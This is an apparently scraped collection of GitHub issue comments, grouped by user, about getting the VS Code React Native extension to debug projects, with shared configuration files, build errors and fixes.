    "inturbidus": "Yes, react-native works on the command line.  Of course I have PATH items in my .bashrc.\nexport ANDROID_HOME=$HOME/Library/Android/sdk\nexport PATH=$ANDROID_HOME/tools:$PATH\nexport PATH=$ANDROID_HOME/platform-tools:$PATH\nexport PATH=$HOME/.nvm/versions/node/v5.10.1/bin/:$PATH\necho $PATH\n/Users/matthudson/.nvm/versions/node/v5.10.1/bin:/Users/matthudson/Library/Android/sdk/platform-tools:/Users/matthudson/Library/Android/sdk/tools:.git/safe/../../bin:/usr/local/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n. Ah!  Perfect!  Running code from command line fixed the issue.\n. This is probably a dumb question, but where would I find my react-native install?\n. Thank you, for some reason when I ran that earlier it came up empty. \n. I have added several breakpoints for a test, here they are:\n```\n  configureScene(route, routeStack){\n->   if(route.type == 'Modal') { \n      return Navigator.SceneConfigs.FloatFromBottom\n    }\n}\nvar NavigationBarRouteMapper = {\n  LeftButton(route, navigator, index, navState) {\n->    if(index > 0) {\n      return (\n         { if (index > 0) { navigator.pop() } }}>\n          Back\n)\n    } \n    else { return null }\n  }\nclass AboutYou extends React.Component {\n  _navigate(name,type) {\n->    this.props.navigator.push(\n      {\n        name: 'Settings',\n        passProps: {\n          name: name\n        },\n        type: type\n      }\n    )\n  }\n```\n. The debugger does stop on the debugger line and logs to the console.\nThe menu says \"Disable Chrome Debugging\"\n. It turns out that my launch.json was missing: \n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\", \nThe reason is that code reports that those params are not allowed, so I had deleted them.  I put them back and the breakpoints are working.\n. Thank you guys so much!  I'm really loving this setup now that it's working!\n. I had to switch after VS Code stopped debugging.  Unfortunate.  But this debugger is much better anyway.\nhttps://github.com/jhen0409/react-native-debugger. @ruslan-bikkinin I followed the steps to update activation events above with extension 0.6.11 and React Native still doesn't show as an environment option.\nVSCOde 1.24.1\nRN 0.55.1\nMac OSX 10.13.13\nNode 8.4.0. Adding a debug configuration for chrome, and then adding another configuration made a context menu popup inside of launch.json and it did have React Native Debug options there.  But it would not show up in Select Environment menu.. ",
    "joseph-teb": "my first day # learning from other comment\nThanks #digeff. ",
    "Andreyco": "Double checked and I am getting very same package.json now. For some reason I did not...\nClosing for now\n. thinking about this, is checking dependencies bulletproof for detecting RN project?\n. Yep, got your point. Thx!\nSent from my iPhone\n\nOn 25. 4. 2016, at 16:40, Jimmy Thomson notifications@github.com wrote:\nIt detects projects created by react-native init, and most projects that work with the react-native cli (e.g. react-native run-ios), but not all projects. For example if you check out the react-native git repo, we don't work with the sample projects there because they don't use the same structure as a react-native init-created project, and you can't use the react-native cli on them.\nSimilarly if I build a react-native compatible project from scratch and manually npm install react-native@... but do not save the dependency to a package.json, then we do not detect that as a react-native project either.\n\u2014\nYou are receiving this because you modified the open/close state.\nReply to this email directly or view it on GitHub\n. \n",
    "WendySanarwanto": "Hello @MSLaguana \n\n\"What happens if you run react-native run-ios in the project root? \"\nIn this case, I have not stop the RN Packager ( the one I ran using npm start command on other terminal window ). I run react-native run-ios in the project on other terminal window. It shows 'Build Failed' log.  Here is the screenshot:\n\n\"..If you ensure that react-native run-ios compiles and runs the app, and that the react-native packager is not running prior to trying to debug with VS Code, then it should work out. \"\n- I close the VS Code. I re-run npm install inside the RN Project Folder then run react-native run-ios as well. The result was I still could see 'error: PCH was compiled with module cache path' as seen in the attached screenshot. However, the weird thing is, it seems that it could build project and run the app on the ios simulator\n- I stopped the react native packager server. Open the project in VS Code and redo the replication steps i mentioned earlier. The result is same error still happen. Here is the screenshot \n  \n\nCheers.\n. Hello @MSLaguana \n\n\".. you could try deleting ios/build which contains intermediate build objects and that may help.\"\nI did your suggestion, run react-native run-ios command and the build error did not happen anymore. Awesome @MSLaguana !\nBack to the main issue, I tried your suggestion to stop react packager server then tried to debug the app from VS Code. The result is the issue did not happen anymore. My VS Code has entered debugging mode successfullly. Again, Thanks for your support @MSLaguana . I will update  (by adding 'Resolution' section', in case some people encountered this issue in the future)  and close this issue.\n\nCheers\n. The issue has been resolved by following @MSLaguana 's suggestion.\n. ",
    "adrianotadao": "Thank you @MSLaguana! You saved my day haahha\n. ",
    "khadkaPratik": "Hello @MSLaguana It ddn't worked in my case rather it gave the following error :\nThe following commands produced analyzer issues:\n    Analyze Base/RCTModuleMethod.mm\n    Analyze Modules/RCTUIManager.m\nBeside that I also have try deleting and reinstalling  node_modele , podfile.lock and pods but the error is the same.\nPlease help me if there is any other way out .\nThank you . @ruslan-bikkinin Hello sir, \nI really don't know what is going on with my project I am just roaming around with different error . I figure out that the error is actually in my podfile which is not letting me install and pod packages .\nbecause of which there are still some issue related to GoogleMapBase, GooglePlacePicker.\n. Hello @ruslan-bikkinin Yes I am able to run react-native run-ios but then the simulator runs and stops at splash screen and @muzammil-triffort  yes i have already tried to do that but it ddn't worked.\nThe only thing I have to do in this project is to compile all the prebuild project in ios but there are several issues after my friend add google sign in on his android project and pushed it to the repo . . ",
    "muzammil-triffort": "Just delete all contents inside build folder. clean everything and run again.. @khadkaPratik your issue might be related to new installed libraries only. You have to figure out that. . ",
    "zhonshu": "react-native run ios same error.\nI first create My project use react-native init, vscode debug success two month ago, today I upgrade react native then vscode debug error.\n. yet, I modify package.json react native new version, rm -rf node_modules directory, then npm install .\nI don`t know this way, have what error? \n. thank you!\nI react-native upgrade, than react-native run-ios have error.\nERROR:\nzhongshudeMacBook-Pro:ArtGallery zhongshu$ react-native run-ios\nFound Xcode workspace ArtGallery.xcworkspace\nLaunching iPhone 6 (9.3)...\nBuilding using \"xcodebuild -workspace ArtGallery.xcworkspace -scheme ArtGallery -destination id=4CE02304-87F8-4E3C-9769-9BF27868BADF -derivedDataPath build\"\nUser defaults from command line:\n    IDEDerivedDataPathOverride = /Users/zhongshu/Documents/Project/ArtGallery/ios/build\nxcodebuild: error: The workspace named \"ArtGallery\" does not contain a scheme named \"ArtGallery\". The \"-list\" option can be used to find the names of the schemes in the workspace.\nInstalling build/Build/Products/Debug-iphonesimulator/ArtGallery.app\nAn error was encountered processing the command (domain=NSPOSIXErrorDomain, code=2):\nFailed to install the requested application\nAn application bundle was not found at the provided path.\nProvide a valid path to the desired application bundle.\nPrint: Entry, \":CFBundleIdentifier\", Does Not Exist\n/Users/zhongshu/Documents/Project/ArtGallery/node_modules/promise/lib/done.js:10\n      throw err;\n      ^\nError: Command failed: /usr/libexec/PlistBuddy -c Print:CFBundleIdentifier build/Build/Products/Debug-iphonesimulator/ArtGallery.app/Info.plist\nPrint: Entry, \":CFBundleIdentifier\", Does Not Exist\nat checkExecSyncError (child_process.js:441:13)\nat Object.execFileSync (child_process.js:461:13)\nat _runIOS (runIOS.js:91:34)\nat runIOS.js:24:5\nat tryCallTwo (/Users/zhongshu/Documents/Project/ArtGallery/node_modules/promise/lib/core.js:45:5)\nat doResolve (/Users/zhongshu/Documents/Project/ArtGallery/node_modules/promise/lib/core.js:200:13)\nat new Promise (/Users/zhongshu/Documents/Project/ArtGallery/node_modules/promise/lib/core.js:66:3)\nat Array.runIOS (runIOS.js:23:10)\nat Object.run (/Users/zhongshu/Documents/Project/ArtGallery/node_modules/react-native/local-cli/cli.js:86:13)\nat Object.<anonymous> (/usr/local/lib/node_modules/react-native-cli/index.js:88:7)\n. I have ios/ArtGallery.xcodeproj/.xcshareddata/xcschemes/ArtGallery.xcscheme this file.\nI try new react-native version init project diff old project\uff0c see different segment add My old project success.\nThankyou very much for providing us such valuable information, When off duty I can do my private work, do this, today back you.\n. ",
    "idavidson12": "Thanks for your response. I can't see any error in the\n.vscode/settings.json file. I'm running VScode 1.1.1.\nHere is the launch.json file that was auto-generated:\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Debug Android\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"android\",\n            \"internalDebuggerPort\": 9090,\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"target\": \"iPhone 5s\",\n            \"internalDebuggerPort\": 9090,\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        }\n    ]\n}\nThanks for you help.\nIver\nOn Thu, May 19, 2016 at 10:54 AM, Jimmy Thomson notifications@github.com\nwrote:\n\nDo you have a .vscode/settings.json file, and is that file a valid JSON\nfile? Sounds like it may have a rogue / in it.\nWhat version of vscode are you using?\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/237#issuecomment-220386199\n. Sure. Here it is:\n\nThanks,\nIver\n// Overwrite settings by placing them into your settings file.\n{\n```\n//-------- Editor configuration --------\n// Controls the font family.\n\"editor.fontFamily\": \"\",\n// Controls the font size.\n\"editor.fontSize\": 0,\n// Controls the line height.\n\"editor.lineHeight\": 0,\n// Controls visibility of line numbers\n\"editor.lineNumbers\": true,\n// Controls visibility of the glyph margin\n\"editor.glyphMargin\": false,\n// Columns at which to show vertical rulers\n\"editor.rulers\": [],\n// Characters that will be used as word separators when doing word\n```\nrelated navigations or operations\n    \"editor.wordSeparators\": \"`~!@#$%^&*()-=+[{]}\\|;:'\\\",.<>/?\",\n```\n// The number of spaces a tab is equal to.\n\"editor.tabSize\": 4,\n// Insert spaces when pressing Tab.\n\"editor.insertSpaces\": true,\n// When opening a file, editor.tabSize and editor.insertSpaces will\n```\nbe detected based on the file contents.\n    \"editor.detectIndentation\": true,\n```\n// Controls if selections have rounded corners\n\"editor.roundedSelection\": true,\n// Controls if the editor will scroll beyond the last line\n\"editor.scrollBeyondLastLine\": true,\n// Controls after how many characters the editor will wrap to the next\n```\nline. Setting this to 0 turns on viewport width wrapping (word wrapping).\nSetting this to -1 forces the editor to never wrap.\n    \"editor.wrappingColumn\": 300,\n// Controls the indentation of wrapped lines. Can be one of 'none',\n'same' or 'indent'.\n    \"editor.wrappingIndent\": \"same\",\n// A multiplier to be used on the `deltaX` and `deltaY` of mouse wheel\nscroll events\n    \"editor.mouseWheelScrollSensitivity\": 1,\n```\n// Controls if quick suggestions should show up or not while typing\n\"editor.quickSuggestions\": true,\n// Controls the delay in ms after which quick suggestions will show up\n\"editor.quickSuggestionsDelay\": 10,\n// Controls if the editor should automatically close brackets after\n```\nopening them\n    \"editor.autoClosingBrackets\": true,\n// Controls if the editor should automatically format the line after\ntyping\n    \"editor.formatOnType\": false,\n// Controls if suggestions should automatically show up when typing\ntrigger characters\n    \"editor.suggestOnTriggerCharacters\": true,\n// Controls if suggestions should be accepted 'Enter' - in addition to\n'Tab'. Helps to avoid ambiguity between inserting new lines or accepting\nsuggestions.\n    \"editor.acceptSuggestionOnEnter\": true,\n// Controls whether the editor should highlight similar matches to the\nselection\n    \"editor.selectionHighlight\": true,\n// Controls the number of decorations that can show up at the same\nposition in the overview ruler\n    \"editor.overviewRulerLanes\": 3,\n// Controls the cursor blinking animation, accepted values are 'blink',\n'visible', and 'hidden'\n    \"editor.cursorBlinking\": \"blink\",\n```\n// Controls the cursor style, accepted values are 'block' and 'line'\n\"editor.cursorStyle\": \"line\",\n// Enables font ligatures\n\"editor.fontLigatures\": false,\n// Controls if the cursor should be hidden in the overview ruler.\n\"editor.hideCursorInOverviewRuler\": false,\n// Controls whether the editor should render whitespace characters\n\"editor.renderWhitespace\": false,\n// Controls if the editor shows reference information for the modes\n```\nthat support it\n    \"editor.referenceInfos\": true,\n```\n// Controls whether the editor has code folding enabled\n\"editor.folding\": true,\n// Controls if the diff editor shows the diff side by side or inline\n\"diffEditor.renderSideBySide\": true,\n// Controls if the diff editor shows changes in leading or trailing\n```\nwhitespace as diffs\n    \"diffEditor.ignoreTrimWhitespace\": true,\n```\n//-------- Window configuration --------\n// When enabled, will open files in a new window instead of reusing an\n```\nexisting instance.\n    \"window.openFilesInNewWindow\": true,\n// Controls how folders are being reopened after a restart. Select\n'none' to never reopen a folder, 'one' to reopen the last folder you worked\non or 'all' to reopen all folders of your last session.\n    \"window.reopenFolders\": \"one\",\n// Adjust the zoom level of the window. The original size is 0 and each\nincrement above (e.g. 1) or below (e.g. -1) represents zooming 20% larger\nor smaller. You can also enter decimals to adjust the zoom level with a\nfiner granularity.\n    \"window.zoomLevel\": 0,\n```\n//-------- Files configuration --------\n// Configure glob patterns for excluding files and folders.\n\"files.exclude\": {\n    \"/.git\": true,\n    \"/.svn\": true,\n    \"**/.DS_Store\": true\n},\n// Configure file associations to languages (e.g. \"*.extension\":\n```\n\"html\"). These have precedence over the default associations of the\nlanguages installed.\n    \"files.associations\": {},\n// The default character set encoding to use when reading and writing\nfiles.\n    \"files.encoding\": \"utf8\",\n```\n// The default end of line character.\n\"files.eol\": \"\\n\",\n// When enabled, will trim trailing whitespace when you save a file.\n\"files.trimTrailingWhitespace\": false,\n// Controls auto save of dirty files. Accepted values:  \"off\",\n```\n\"afterDelay\", \"onFocusChange\". If set to \"afterDelay\" you can configure the\ndelay in \"files.autoSaveDelay\".\n    \"files.autoSave\": \"off\",\n// Controls the delay in ms after which a dirty file is saved\nautomatically. Only applies when \"files.autoSave\" is set to \"afterDelay\"\n    \"files.autoSaveDelay\": 1000,\n// Configure glob patterns of file paths to exclude from file watching.\nChanging this setting requires a restart. When you experience Code\nconsuming lots of cpu time on startup, you can exclude large folders to\nreduce the initial load.\n    \"files.watcherExclude\": {\n        \"/.git/objects/\": true,\n        \"/node_modules/\": true\n    },\n```\n//-------- Emmet configuration --------\n// When enabled, emmet abbreviations are expanded when pressing TAB.\n\"emmet.triggerExpansionOnTab\": true,\n//-------- File Explorer configuration --------\n// Maximum number of working files to show before scrollbars appear.\n\"explorer.workingFiles.maxVisible\": 9,\n// Controls if the height of the working files section should adapt\n```\ndynamically to the number of elements or not.\n    \"explorer.workingFiles.dynamicHeight\": true,\n// Controls if the explorer should automatically reveal files when\nopening them.\n    \"explorer.autoReveal\": true,\n```\n//-------- HTTP configuration --------\n// The proxy setting to use. If not set will be taken from the\n```\nhttp_proxy and https_proxy environment variables\n    \"http.proxy\": \"\",\n// Whether the proxy server certificate should be verified against the\nlist of supplied CAs.\n    \"http.proxyStrictSSL\": true,\n```\n//-------- Search configuration --------\n// Configure glob patterns for excluding files and folders in searches.\n```\nInherits all glob patterns from the files.exclude setting.\n    \"search.exclude\": {\n        \"/node_modules\": true,\n        \"/bower_components\": true\n    },\n```\n//-------- Update configuration --------\n// Configure the update channel to receive updates from. Requires a\n```\nrestart after change.\n    \"update.channel\": \"default\",\n```\n//-------- Git configuration --------\n// Is git enabled\n\"git.enabled\": true,\n// Path to the git executable\n\"git.path\": null,\n// Whether auto fetching is enabled.\n\"git.autofetch\": true,\n//-------- JSON configuration --------\n// Associate schemas to JSON files in the current project\n\"json.schemas\": [],\n//-------- Markdown preview configuration --------\n// A list of URLs or local paths to CSS style sheets to use from the\n```\nmarkdown preview.\n    \"markdown.styles\": [],\n```\n//-------- HTML configuration --------\n// Maximum amount of characters per line (0 = disable).\n\"html.format.wrapLineLength\": 120,\n// List of tags, comma separated, that shouldn't be reformatted. 'null'\n```\ndefaults to all inline tags.\n    \"html.format.unformatted\": null,\n```\n// Indent  and  sections.\n\"html.format.indentInnerHtml\": false,\n// Whether existing line breaks before elements should be preserved.\n```\nOnly works before elements, not inside tags or for text.\n    \"html.format.preserveNewLines\": true,\n// Maximum number of line breaks to be preserved in one chunk. Use\n'null' for unlimited.\n    \"html.format.maxPreserveNewLines\": null,\n```\n// Format and indent {{#foo}} and {{/foo}}.\n\"html.format.indentHandlebars\": false,\n// End with a newline.\n\"html.format.endWithNewline\": false,\n// List of tags, comma separated, that should have an extra newline\n```\nbefore them. 'null' defaults to \"head, body, /html\".\n    \"html.format.extraLiners\": null,\n```\n//-------- CSS configuration --------\n// Controls CSS validation and problem severities.\n// Enables or disables all validations\n\"css.validate\": true,\n// When using a vendor-specific prefix make sure to also include all\n```\nother vendor-specific properties\n    \"css.lint.compatibleVendorPrefixes\": \"ignore\",\n// When using a vendor-specific prefix also include the standard\nproperty\n    \"css.lint.vendorPrefix\": \"warning\",\n```\n// Do not use duplicate style definitions\n\"css.lint.duplicateProperties\": \"ignore\",\n// Do not use empty rulesets\n\"css.lint.emptyRules\": \"warning\",\n// Import statements do not load in parallel\n\"css.lint.importStatement\": \"ignore\",\n// Do not use width or height when using padding or border\n\"css.lint.boxModel\": \"ignore\",\n// The universal selector (*) is known to be slow\n\"css.lint.universalSelector\": \"ignore\",\n// No unit for zero needed\n\"css.lint.zeroUnits\": \"ignore\",\n// @font-face rule must define 'src' and 'font-family' properties\n\"css.lint.fontFaceProperties\": \"warning\",\n// Hex colors must consist of three or six hex numbers\n\"css.lint.hexColorLength\": \"error\",\n// Invalid number of parameters\n\"css.lint.argumentsInColorFunction\": \"error\",\n// Unknown property.\n\"css.lint.unknownProperties\": \"warning\",\n// IE hacks are only necessary when supporting IE7 and older\n\"css.lint.ieHack\": \"ignore\",\n// Unknown vendor specific property.\n\"css.lint.unknownVendorSpecificProperties\": \"ignore\",\n// Property is ignored due to the display. E.g. with 'display: inline',\n```\nthe width, height, margin-top, margin-bottom, and float properties have no\neffect\n    \"css.lint.propertyIgnoredDueToDisplay\": \"warning\",\n// Avoid using !important. It is an indication that the specificity of\nthe entire CSS has gotten out of control and needs to be refactored.\n    \"css.lint.important\": \"ignore\",\n// Avoid using 'float'. Floats lead to fragile CSS that is easy to\nbreak if one aspect of the layout changes.\n    \"css.lint.float\": \"ignore\",\n// Selectors should not contain IDs because these rules are too tightly\ncoupled with the HTML.\n    \"css.lint.idSelector\": \"ignore\",\n```\n//-------- Telemetry configuration --------\n// Enable crash reports to be sent to Microsoft.\n```\n// This option requires restart to take effect.\n    \"telemetry.enableCrashReporter\": true,\n```\n//-------- Telemetry configuration --------\n// Enable usage data and errors to be sent to Microsoft.\n\"telemetry.enableTelemetry\": true,\n//-------- LESS configuration --------\n// Controls LESS validation and problem severities.\n// Enables or disables all validations\n\"less.validate\": true,\n// When using a vendor-specific prefix make sure to also include all\n```\nother vendor-specific properties\n    \"less.lint.compatibleVendorPrefixes\": \"ignore\",\n// When using a vendor-specific prefix also include the standard\nproperty\n    \"less.lint.vendorPrefix\": \"warning\",\n```\n// Do not use duplicate style definitions\n\"less.lint.duplicateProperties\": \"ignore\",\n// Do not use empty rulesets\n\"less.lint.emptyRules\": \"warning\",\n// Import statements do not load in parallel\n\"less.lint.importStatement\": \"ignore\",\n// Do not use width or height when using padding or border\n\"less.lint.boxModel\": \"ignore\",\n// The universal selector (*) is known to be slow\n\"less.lint.universalSelector\": \"ignore\",\n// No unit for zero needed\n\"less.lint.zeroUnits\": \"ignore\",\n// @font-face rule must define 'src' and 'font-family' properties\n\"less.lint.fontFaceProperties\": \"warning\",\n// Hex colors must consist of three or six hex numbers\n\"less.lint.hexColorLength\": \"error\",\n// Invalid number of parameters\n\"less.lint.argumentsInColorFunction\": \"error\",\n// Unknown property.\n\"less.lint.unknownProperties\": \"warning\",\n// IE hacks are only necessary when supporting IE7 and older\n\"less.lint.ieHack\": \"ignore\",\n// Unknown vendor specific property.\n\"less.lint.unknownVendorSpecificProperties\": \"ignore\",\n// Property is ignored due to the display. E.g. with 'display: inline',\n```\nthe width, height, margin-top, margin-bottom, and float properties have no\neffect\n    \"less.lint.propertyIgnoredDueToDisplay\": \"warning\",\n// Avoid using !important. It is an indication that the specificity of\nthe entire CSS has gotten out of control and needs to be refactored.\n    \"less.lint.important\": \"ignore\",\n// Avoid using 'float'. Floats lead to fragile CSS that is easy to\nbreak if one aspect of the layout changes.\n    \"less.lint.float\": \"ignore\",\n// Selectors should not contain IDs because these rules are too tightly\ncoupled with the HTML.\n    \"less.lint.idSelector\": \"ignore\",\n```\n//-------- Sass configuration --------\n// Controls Sass validation and problem severities.\n// Enables or disables all validations\n\"sass.validate\": true,\n// When using a vendor-specific prefix make sure to also include all\n```\nother vendor-specific properties\n    \"sass.lint.compatibleVendorPrefixes\": \"ignore\",\n// When using a vendor-specific prefix also include the standard\nproperty\n    \"sass.lint.vendorPrefix\": \"warning\",\n```\n// Do not use duplicate style definitions\n\"sass.lint.duplicateProperties\": \"ignore\",\n// Do not use empty rulesets\n\"sass.lint.emptyRules\": \"warning\",\n// Import statements do not load in parallel\n\"sass.lint.importStatement\": \"ignore\",\n// Do not use width or height when using padding or border\n\"sass.lint.boxModel\": \"ignore\",\n// The universal selector (*) is known to be slow\n\"sass.lint.universalSelector\": \"ignore\",\n// No unit for zero needed\n\"sass.lint.zeroUnits\": \"ignore\",\n// @font-face rule must define 'src' and 'font-family' properties\n\"sass.lint.fontFaceProperties\": \"warning\",\n// Hex colors must consist of three or six hex numbers\n\"sass.lint.hexColorLength\": \"error\",\n// Invalid number of parameters\n\"sass.lint.argumentsInColorFunction\": \"error\",\n// Unknown property.\n\"sass.lint.unknownProperties\": \"warning\",\n// IE hacks are only necessary when supporting IE7 and older\n\"sass.lint.ieHack\": \"ignore\",\n// Unknown vendor specific property.\n\"sass.lint.unknownVendorSpecificProperties\": \"ignore\",\n// Property is ignored due to the display. E.g. with 'display: inline',\n```\nthe width, height, margin-top, margin-bottom, and float properties have no\neffect\n    \"sass.lint.propertyIgnoredDueToDisplay\": \"warning\",\n// Avoid using !important. It is an indication that the specificity of\nthe entire CSS has gotten out of control and needs to be refactored.\n    \"sass.lint.important\": \"ignore\",\n// Avoid using 'float'. Floats lead to fragile CSS that is easy to\nbreak if one aspect of the layout changes.\n    \"sass.lint.float\": \"ignore\",\n// Selectors should not contain IDs because these rules are too tightly\ncoupled with the HTML.\n    \"sass.lint.idSelector\": \"ignore\",\n```\n//-------- External terminal configuration --------\n// Customizes which terminal to run on Windows.\n\"externalTerminal.windowsExec\": \"cmd\",\n// Customizes which terminal to run on Linux.\n\"externalTerminal.linuxExec\": \"x-terminal-emulator\",\n//-------- TypeScript configuration --------\n// Specifies the folder path containing the tsserver and lib*.d.ts\n```\nfiles to use.\n    \"typescript.tsdk\": null,\n```\n// Complete functions with their parameter signature.\n\"typescript.useCodeSnippetsOnMethodSuggest\": false,\n// Enable / disable TypeScript validation\n\"typescript.validate.enable\": true,\n// Enables tracing of messages send to the TS server\n\"typescript.tsserver.trace\": \"off\",\n// Defines space handling after a comma delimiter\n\"typescript.format.insertSpaceAfterCommaDelimiter\": true,\n//  Defines space handling after a semicolon in a for statement\n\"typescript.format.insertSpaceAfterSemicolonInForStatements\": true,\n// Defines space handling after a binary operator\n\"typescript.format.insertSpaceBeforeAndAfterBinaryOperators\": true,\n// Defines space handling after keywords in control flow statement\n\"typescript.format.insertSpaceAfterKeywordsInControlFlowStatements\":\n```\ntrue,\n// Defines space handling after function keyword for anonymous functions\n\"typescript.format.insertSpaceAfterFunctionKeywordForAnonymousFunctions\":\ntrue,\n// Defines space handling after opening and before closing non empty\nparenthesis\n\"typescript.format.insertSpaceAfterOpeningAndBeforeClosingNonemptyParenthesis\":\nfalse,\n// Defines space handling after opening and before closing non empty\nbrackets\n\"typescript.format.insertSpaceAfterOpeningAndBeforeClosingNonemptyBrackets\":\nfalse,\n// Defines whether an open brace is put onto a new line for functions\nor not\n    \"typescript.format.placeOpenBraceOnNewLineForFunctions\": false,\n// Defines whether an open brace is put onto a new line for control\nblocks or not\n    \"typescript.format.placeOpenBraceOnNewLineForControlBlocks\": false,\n```\n// Enable / disable JavaScript validation\n\"javascript.validate.enable\": true,\n// Defines space handling after a comma delimiter\n\"javascript.format.insertSpaceAfterCommaDelimiter\": true,\n//  Defines space handling after a semicolon in a for statement\n\"javascript.format.insertSpaceAfterSemicolonInForStatements\": true,\n// Defines space handling after a binary operator\n\"javascript.format.insertSpaceBeforeAndAfterBinaryOperators\": true,\n// Defines space handling after keywords in control flow statement\n\"javascript.format.insertSpaceAfterKeywordsInControlFlowStatements\":\n```\ntrue,\n// Defines space handling after function keyword for anonymous functions\n\"javascript.format.insertSpaceAfterFunctionKeywordForAnonymousFunctions\":\ntrue,\n// Defines space handling after opening and before closing non empty\nparenthesis\n\"javascript.format.insertSpaceAfterOpeningAndBeforeClosingNonemptyParenthesis\":\nfalse,\n// Defines space handling after opening and before closing non empty\nbrackets\n\"javascript.format.insertSpaceAfterOpeningAndBeforeClosingNonemptyBrackets\":\nfalse,\n// Defines whether an open brace is put onto a new line for functions\nor not\n    \"javascript.format.placeOpenBraceOnNewLineForFunctions\": false,\n// Defines whether an open brace is put onto a new line for control\nblocks or not\n    \"javascript.format.placeOpenBraceOnNewLineForControlBlocks\": false,\n```\n//-------- PHP Configuration options --------\n// Whether php validation is enabled or not.\n\"php.validate.enable\": true,\n// Points to the php executable.\n\"php.validate.executablePath\": null,\n// Whether the linter is run on save or on type.\n\"php.validate.run\": \"onSave\"\n```\n}\nOn Thu, May 19, 2016 at 12:07 PM, Jimmy Thomson notifications@github.com\nwrote:\n\nCan you please share your settings.json file? Just to make sure you\ndidn't miss anything. The launch.json is unrelated to configuring\nintellisense.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/237#issuecomment-220405912\n. Are you saying I should remove the comments?\n\nIver\nOn Thu, May 19, 2016 at 3:23 PM, Jimmy Thomson notifications@github.com\nwrote:\n\nI see the problem: Currently we try to JSON.parse the settings file,\nwhich requires that it is legal json which forbids comments in files.\nVSCode has a more liberal interpretation, so we really should fix that. For\nnow it should be relatively harmless; I believe that with current VSCode\nversions our modifications there were not required.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/237#issuecomment-220450384\n. Thank you. I don't get the error message anymore. I'm still not a\nReactNative option under Language Mode for code hinting.\n\nThanks for your help. I appreciate it.\nIver\nOn Thu, May 19, 2016 at 4:47 PM, Jimmy Thomson notifications@github.com\nwrote:\n\nIf you remove the comments then our code should work, but I don't believe\nthat is necessary: since you are on a recent version of vscode, the\nintellisense setup that we do is not required. You should still be able to\nedit and debug your app successfully. If that is not the case, please let\nus know.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/237#issuecomment-220467490\n. Great. Thank you for your help.\n\nOn Fri, May 20, 2016 at 9:14 AM, Jimmy Thomson notifications@github.com\nwrote:\n\nThere will not be a \"react-native\" language mode, but there should be a JavaScript\nReact mode available which understands JSX syntax. The react-native\nspecific functionality is provided in the form of additional typings for\nthe react-native library, and not a change in the language mode.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/Microsoft/vscode-react-native/issues/237#issuecomment-220633706\n. \n",
    "Olaman": "I got this problem on window with vs code 1.1.1. By checking a new project, I found the .vscode/setting.json is empty. So I clear these entities in setting.json. Everything works!\n. ",
    "frogcjn": "Why not use typescript API to read tsconfig.json?\n. There is already a removeComments function, and read tsconfig function in Typescript compiler.\nhttps://github.com/Microsoft/TypeScript/blob/master/src/compiler/commandLineParser.ts#L648\nSee https://github.com/Microsoft/vscode-react-native/issues/243\n. So recently we cannot debug in typescript?\n. @joewood \nHere is my post to explain how to deal with this debugger problem with typescript:\nmake_VSCode_debug_RN_TS.md\nAlso refer to these two issues\nhttps://github.com/facebook/react-native/issues/393\nhttps://github.com/facebook/react-native/issues/7083\n. I have make some progress on debugging typescript in vscode\n\n. Success! I'll write a post to explain how to debug typescript file with react native in vscode.\n\n. @joewood \nHere is my post to explain how to debug ReactNative project in VSCode with typescript:\nmake_VSCode_debug_RN_TS.md\n. And of course, when there is a files configuration in tsconfig.json, there is no need to exclude node_module.\n. @joewood\nI use strip-json-comments, looks more popular than json-comments\n. @MSLaguana \"This branch has conflicts that must be resolved\". So I think I cannot merge the master branch with mine.\n. @MSLaguana , any other issue?\n. @MSLaguana ?\n. @MSLaguana Thanks! They are unnecessary code. I just wanted to keep the original function untouched since some of them are public. I did not have full knowledge of that module.\n. @MSLaguana strip-json-comments is not in the package file. I've removed it at https://github.com/Microsoft/vscode-react-native/pull/245/commits/abf68216cc7955415b5359b8903fa6788f3bf88a\n. VSCode React Native Tool cannot attach to another debugger. It is not like Chrome attachable debugger.\nIt will use  a special folder .vscode/.react/ as a start point.\n. @MSLaguana \nThere is no frequent alert right now. Thanks!\n. @MSLaguana , here is the squashed branch \n. @digeff Use console.log?\n. @digeff updated\n. @digeff should I revise?\n. @MSLaguana There is already a consider to tsConfig not exists. Do you mean this?\n. @MSLaguana if no stripJsonComments package, how to parse JSON file with comments? Just using JSON.parse to parse a json file with comments will trigger an error.\n. @MSLaguana Sorry. I forgot to push the commit.\n. ",
